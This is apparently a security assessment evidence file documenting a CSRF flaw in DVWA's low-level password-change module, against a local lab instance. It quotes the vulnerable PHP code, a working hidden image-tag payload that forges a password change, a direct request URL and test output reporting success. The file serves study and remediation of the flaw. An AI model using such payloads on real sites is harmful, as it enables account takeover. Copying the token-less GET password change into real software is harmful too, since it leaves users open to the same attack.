# Evidence 08 - Cross-Site Request Forgery (Before Remediation)

## 1. Vulnerability Overview
* **Vulnerable Module**: DVWA Cross-Site Request Forgery (CSRF)
* **File Location**: `app/vulnerabilities/csrf/source/low.php`
* **Vulnerability Class**: CWE-352 (Cross-Site Request Forgery) / OWASP A01:2021 - Broken Access Control
* **Default Security Level**: `low`

## 2. Vulnerable Code Analysis
In `app/vulnerabilities/csrf/source/low.php`:
```php
if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( ... );

        $html .= "<pre>Password Changed.</pre>";
    }
}
```
1. State-changing password update is accepted over HTTP `GET`.
2. No anti-CSRF token (`user_token`) is checked or required.
3. No re-authentication or verification of the current password is performed.

## 3. Pre-Fix Attack Procedure & Live Payload
* **Endpoint URL**: `http://127.0.0.1:4280/vulnerabilities/csrf/`
* **HTTP Method**: `GET`
* **Attack Scenario**: Attacker hosts a malicious page with an image tag:
  ```html
  <img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" width="0" height="0" />
  ```
* **Direct Test Request**:
  ```text
  http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
  ```

## 4. Expected & Actual Vulnerable Behavior
When an authenticated victim visits the attacker-controlled link, the victim's browser sends the request along with their session cookie `PHPSESSID`. The DVWA server accepts the request without validation and changes the victim's password.

### Live Terminal Proof (Automated Test Execution)
```text
[*] Request URI: http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
[!] EXPLOIT SUCCESS (VULNERABLE): Password changed via GET request without anti-CSRF token!
[*] Reset password back to 'password'.
```

## 5. Security Impact
- **Account Takeover**: Attacker locks legitimate users out of their accounts.
- **Unauthorized Administrative State Changes**: If triggered by an admin, full system takeover is possible.
- **Pre-Mitigation Risk Rating**: **Likelihood: 3 (High)** × **Impact: 2 (Medium)** = **6 (High)**.

## 6. Manual Screenshot Checklist
Capture and place the following screenshots in this directory:
- `csrf-before-browser.png`: Browser view showing successful "Password Changed." message upon accessing the forged GET URL.
- `csrf-before-poc-html.png`: Screenshot of a local `poc.html` file embedding the malicious `<img>` tag and triggering the silent password reset.
